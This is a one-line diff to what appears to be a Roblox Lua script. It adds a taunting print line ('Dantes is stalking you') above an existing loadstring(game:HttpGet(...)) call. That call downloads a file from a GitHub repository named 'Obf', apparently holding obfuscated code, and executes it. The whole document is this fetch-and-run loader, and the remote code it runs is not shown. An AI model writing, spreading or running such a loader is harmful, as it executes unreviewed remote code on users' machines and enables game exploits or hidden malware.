@@ -1,1 +1,2 @@
+print("Dantes is stalking you")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EtherbyteHub/Obf/refs/heads/main/Protected_4510980336522669.txt",true))()
